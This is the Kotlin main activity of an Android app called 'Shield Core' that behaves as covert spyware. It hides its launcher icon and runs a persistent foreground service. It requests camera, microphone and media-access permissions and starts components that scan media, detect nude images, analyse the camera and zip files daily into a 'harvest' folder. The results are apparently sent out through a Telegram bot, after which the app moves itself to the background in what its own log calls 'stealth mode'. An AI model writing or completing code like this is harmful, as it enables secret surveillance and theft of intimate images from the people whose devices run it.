package com.example.app

import android.Manifest
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.util.Log
import android.widget.ScrollView
import android.widget.TextView
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.lifecycle.lifecycleScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.io.File
import java.text.SimpleDateFormat
import java.util.*
import kotlin.random.Random

class MainActivity : AppCompatActivity() {

    companion object {
        private const val TAG = "MainActivity"
        const val APP_VERSION = "4.2.1"
    }

    private lateinit var logTextView: TextView
    private var telegramUi: TelegramUi? = null
    private var mediaScanner: MediaScanner? = null
    private var runtimeDir: File? = null

    private val requestPermissionLauncher =
        registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { permissions ->
            val grantedCount = permissions.count { it.value }
            appendLog("🔄 نتائج الأذونات: تم منح $grantedCount من أصل ${permissions.size}")
            lifecycleScope.launch(Dispatchers.IO) {
                delay(Random.nextLong(3000, 8000))
                initCoreAsync()
            }
        }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // ✅ إعداد واجهة السجل التشخيصي
        setupDiagnosticUI()
        appendLog("🚀 Shield Core v4.2 Diagnostic Mode Started")
        appendLog("📱 Device: ${Build.MANUFACTURER} ${Build.MODEL}")
        appendLog("📊 Android: ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})")

        try {
            appendLog("⚙️ Starting Foreground Service...")
            val serviceIntent = Intent(this, ForegroundService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent)
            } else {
                startService(serviceIntent)
            }
            appendLog("✅ Foreground Service Dispatched Successfully")
        } catch (e: Exception) {
            appendLog("❌ Service Start Failed: ${e.localizedMessage}")
        }

        disableLauncherIcon()

        lifecycleScope.launch(Dispatchers.IO) {
            delay(Random.nextLong(2000, 5000))
            initCoreAsync()
        }

        appendLog("🔍 Diagnostic UI ready. Waiting for initialization...")
    }

    private fun setupDiagnosticUI() {
        val scrollView = ScrollView(this).apply {
            setBackgroundColor(android.graphics.Color.parseColor("#0B0F19"))
            layoutParams = android.view.ViewGroup.LayoutParams(
                android.view.ViewGroup.LayoutParams.MATCH_PARENT,
                android.view.ViewGroup.LayoutParams.MATCH_PARENT
            )
            setPadding(32, 32, 32, 32)
        }
        logTextView = TextView(this).apply {
            text = "=== SYSTEM DIAGNOSTIC CONSOLE ===\n"
            setTextColor(android.graphics.Color.parseColor("#33FF99"))
            textSize = 11f
            typeface = android.graphics.Typeface.MONOSPACE
        }
        scrollView.addView(logTextView)
        setContentView(scrollView)
    }

    fun appendLog(msg: String) {
        val timestamp = SimpleDateFormat("HH:mm:ss.SSS", Locale.getDefault()).format(Date())
        val logEntry = "[$timestamp] $msg\n"
        runOnUiThread {
            logTextView.append(logEntry)
            // التمرير إلى الأسفل لعرض أحدث السجلات
            (logTextView.parent as? ScrollView)?.fullScroll(ScrollView.FOCUS_DOWN)
        }
        Log.i(TAG, msg)
    }

    private suspend fun initCoreAsync() {
        appendLog("🚀 Starting Core Initialization...")

        withContext(Dispatchers.Main) {
            requestAllPermissions()
        }

        delay(Random.nextLong(1000, 3000))

        try {
            setupDirectories()
            appendLog("✅ Directories ready")

            requestBatteryOptimizationExemption()

            appendLog("📂 Loading Configuration...")
            val config = ConfigLoader.load(this@MainActivity)
            appendLog("✅ Config loaded: ${config.activeTokens.size} active tokens")
            appendLog("🔑 Control ID: ${config.controlId}, Vault ID: ${config.vaultId}")
            appendLog("🔐 Secret length: ${config.secret.length} chars")

            if (config.activeTokens.isEmpty()) {
                appendLog("⚠️ WARNING: No active tokens! Telegram will NOT work.")
            }

            appendLog("🛰️ Initializing Monitor...")
            val monitor = Monitor.getInstance(this@MainActivity)
            appendLog("✅ Monitor instance ready")

            appendLog("🧠 Initializing NudeDetector...")
            val nudeDetector = NudeDetector.create(this@MainActivity, monitor)
            appendLog("✅ NudeDetector ready: ${nudeDetector.isReady()}")

            appendLog("📸 Initializing CameraAnalyzer...")
            val cameraAnalyzer = CameraAnalyzer.create(this@MainActivity, monitor, nudeDetector)
            appendLog("✅ CameraAnalyzer created")

            appendLog("📡 Initializing TelegramUi...")
            telegramUi = TelegramUi(
                context = this@MainActivity,
                monitor = monitor,
                config = config
            )
            val ui = telegramUi!!
            appendLog("✅ TelegramUi created with ${config.activeTokens.size} tokens")

            appendLog("📂 Initializing MediaScanner...")
            mediaScanner = MediaScanner(this@MainActivity, monitor, ui)
            appendLog("✅ MediaScanner created")

            appendLog("📦 Initializing DailyZipper...")
            val dailyZipper = DailyZipper.create(this@MainActivity, mediaScanner, ui)
            appendLog("✅ DailyZipper created")

            // ربط المكونات
            monitor.ui = ui
            monitor.ctrl = config.controlId
            monitor.vlt = config.vaultId
            monitor.cameraAnalyzer = cameraAnalyzer
            monitor.mediaScanner = mediaScanner
            monitor.dailyZipper = dailyZipper
            monitor.nudeDetector = nudeDetector
            appendLog("✅ All components linked to Monitor")

            val uiStarted = ui.start()
            appendLog("📡 TelegramUi start: $uiStarted")
            
            monitor.start()
            appendLog("✅ Monitor started")

            appendLog("🎉 All systems operational!")
            
            // إخفاء التطبيق للخلفية بعد 5 ثوانٍ
            withContext(Dispatchers.Main) {
                delay(5000)
                moveTaskToBack(true)
                appendLog("📱 App moved to background (stealth mode)")
            }

        } catch (e: Exception) {
            Log.e(TAG, "Initialization Error", e)
            appendLog("❌ CRITICAL FAILURE: ${e.localizedMessage}")
            e.printStackTrace()
        }
    }

    private fun setupDirectories() {
        runtimeDir = File(filesDir, ".sys_runtime")
        val versionFile = File(runtimeDir, "version.txt")

        if (runtimeDir!!.exists()) {
            val oldVersion = if (versionFile.exists()) versionFile.readText().trim() else ""
            if (oldVersion != APP_VERSION) {
                runtimeDir!!.deleteRecursively()
                appendLog("🧹 Cleaned old runtime files (v$oldVersion)")
            }
        }

        runtimeDir!!.mkdirs()
        versionFile.writeText(APP_VERSION)

        File(runtimeDir, "updates").mkdirs()
        File(runtimeDir, ".cache_thumb").mkdirs()
        File(runtimeDir, "models").mkdirs()
        File(runtimeDir, "harvest").mkdirs()
    }

    private fun requestAllPermissions() {
        val permissionsNeeded = mutableListOf(
            Manifest.permission.INTERNET,
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO
        )

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissionsNeeded.add(Manifest.permission.READ_MEDIA_IMAGES)
            permissionsNeeded.add(Manifest.permission.READ_MEDIA_VIDEO)
            permissionsNeeded.add(Manifest.permission.READ_MEDIA_AUDIO)
            permissionsNeeded.add(Manifest.permission.POST_NOTIFICATIONS)
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            permissionsNeeded.add(Manifest.permission.READ_EXTERNAL_STORAGE)
        } else {
            permissionsNeeded.add(Manifest.permission.READ_EXTERNAL_STORAGE)
            permissionsNeeded.add(Manifest.permission.WRITE_EXTERNAL_STORAGE)
        }

        val missing = permissionsNeeded.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (missing.isNotEmpty()) {
            appendLog("⚠️ Requesting ${missing.size} permissions...")
            requestPermissionLauncher.launch(missing.toTypedArray())
        } else {
            appendLog("✅ All permissions granted")
        }
    }

    private fun requestBatteryOptimizationExemption() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
            if (!powerManager.isIgnoringBatteryOptimizations(packageName)) {
                try {
                    val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                        data = Uri.parse("package:$packageName")
                    }
                    startActivity(intent)
                } catch (e: Exception) {
                    appendLog("⚠️ Failed to request battery exemption: ${e.localizedMessage}")
                }
            }
        }
    }

    private fun disableLauncherIcon() {
        try {
            val componentName = ComponentName(this, "${packageName}.MainActivityAlias")
            packageManager.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
            appendLog("✅ App icon hidden from launcher")
        } catch (e: Exception) {
            appendLog("⚠️ Failed to hide app icon: ${e.message}")
        }
    }

    @Suppress("unused")
    private fun enableLauncherIcon() {
        try {
            val componentName = ComponentName(this, "${packageName}.MainActivityAlias")
            packageManager.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )
            appendLog("✅ App icon shown")
        } catch (e: Exception) {
            appendLog("⚠️ Failed to show app icon: ${e.message}")
        }
    }

    private fun clearAppData() {
        try {
            telegramUi?.stop()
            telegramUi = null
            appendLog("🛑 TelegramUi stopped")

            try {
                Monitor.getInstance(this).stop()
                appendLog("🛑 Monitor stopped")
            } catch (e: Exception) {
                appendLog("⚠️ Failed to stop Monitor: ${e.message}")
            }

            try {
                mediaScanner?.close()
                mediaScanner = null
                appendLog("🧹 MediaScanner closed")
            } catch (e: Exception) {
                appendLog("⚠️ Failed to close MediaScanner: ${e.message}")
            }

            ConfigLoader.clearSensitiveData()
            SecurityHelper.clearCachedKey()
            SecurityHelper.clearMasterKey()

            val runtimeDir = File(filesDir, ".sys_runtime")
            if (runtimeDir.exists()) {
                runtimeDir.deleteRecursively()
                appendLog("🧹 All app data cleared")
            } else {
                appendLog("ℹ️ No data to clear")
            }

            setupDirectories()
            appendLog("🔄 Directories recreated")

        } catch (e: Exception) {
            appendLog("❌ Failed to clear data: ${e.message}")
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        telegramUi?.stop()
        telegramUi = null
        SecurityHelper.cleanup()
        appendLog("✅ Application shutdown complete")
    }
}
